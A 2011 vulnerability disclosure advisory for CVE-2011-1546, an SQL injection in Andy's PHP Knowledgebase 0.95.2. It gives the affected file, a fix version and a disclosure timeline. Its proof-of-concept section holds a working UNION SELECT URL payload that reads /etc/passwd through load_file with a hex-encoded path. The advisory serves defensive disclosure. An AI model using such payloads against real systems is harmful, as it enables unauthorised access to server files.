@@ -1,0 +1,37 @@
+'Andy's PHP Knowledgebase' SQL Injection Vulnerability (CVE-2011-1546)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+A vulnerability exists in a_viewusers.php allowing for SQL injection of the 's' query parameter.
+
+ 
+II. TESTED VERSION
+---------------------------------------
+0.95.2
+
+
+III. PoC EXPLOIT
+---------------------------------------
+http://www.example.com/aphpkb/a_viewusers.php?s=1%20UNION%20SELECT%20load_file(0x2f6574632f706173737764),null,null,null,null,null,null%20limit%200
+
+
+IV. SOLUTION
+---------------------------------------
+Upgrade to 0.95.3 or above.
+
+
+V. REFERENCES
+---------------------------------------
+http://www.aphpkb.org/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1546
+http://www.uncompiled.com/2011/03/cve-2011-1546/
+
+
+VI. TIMELINE
+---------------------------------------
+03/13/2011 - Initial vendor disclosure
+03/16/2011 - Vendor patched and released an updated version
+03/16/2011 - Confirmed fix & disclosure date
+03/30/2011 - Public disclosure
